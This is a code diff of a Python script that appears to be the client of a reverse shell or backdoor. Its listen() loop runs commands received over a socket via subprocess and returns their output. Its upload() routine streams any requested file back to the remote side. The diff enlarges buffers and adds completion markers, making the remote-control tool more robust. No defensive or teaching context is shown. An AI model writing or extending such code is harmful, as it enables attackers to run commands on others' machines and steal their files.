@@ -20,7 +20,7 @@ def connect():
 
 def listen():
     while True:
-        data = s.recv(1024).decode("utf-8")
+        data = s.recv(4096).decode("utf-8")
         if str(data) == 'download':
             upload()
             continue
@@ -29,20 +29,20 @@ def listen():
             continue
         if str(data) == 'q':
             break
-        cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
-        cmd_bytes = cmd.stdout.read()
-        s.send(cmd_bytes)
+        cmd = subprocess.run(data, capture_output=True)
+        s.send(cmd.stdout)
+        s.send("--complete--".encode("utf-8"))
 
 # upload
 def upload():
-    filename = s.recv(1024)
+    filename = s.recv(4096).decode("utf-8")
     f = open(filename, 'rb')
-    i = f.read(1024)
+    i = f.read(4096)
     while (i):
         s.send(i)
-        i = f.read(1024)
+        i = f.read(4096)
     f.close()
-    s.send('complete')
+    s.send('--complete--'.encode("utf-8"))
 
 def close():
     s.close()
